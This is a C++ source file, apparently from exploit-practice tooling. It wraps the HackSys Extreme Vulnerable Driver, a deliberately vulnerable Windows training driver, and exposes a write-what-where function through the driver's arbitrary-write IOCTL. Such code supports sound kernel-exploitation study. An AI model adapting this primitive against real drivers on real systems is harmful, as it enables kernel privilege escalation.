#include "HevdWrapper.hpp"

#include "ioctls.hpp"

bool HevdWrapper::isDriverLoaded() {
	if (INVALID_HANDLE_VALUE == device) {
		device = CreateFileA(
			"\\\\.\\HacksysExtremeVulnerableDriver",
			GENERIC_READ | GENERIC_WRITE,
			FILE_SHARE_READ | FILE_SHARE_WRITE,
			0,
			OPEN_EXISTING,
			FILE_ATTRIBUTE_NORMAL,
			0
		);
		if (INVALID_HANDLE_VALUE == device) {
			return false;
		}
	}
	return true;
}

HevdWrapper::~HevdWrapper() {
	if (INVALID_HANDLE_VALUE != device) {
		CloseHandle(device);
	}
}

bool HevdWrapper::writeWhatWhere(void * what, void * where) {
	if (!isDriverLoaded()) {
		return false;
	}
	
	struct {
		PVOID64 what, where;
	} inBuffer = {what, where};
	
	bool ret = DeviceIoControl(
		device,
		HEVD_IOCTL_ARBITRARY_WRITE,
		&inBuffer,
		sizeof(inBuffer),
		nullptr,
		0,
		nullptr,
		nullptr
	);
	return ret;
}
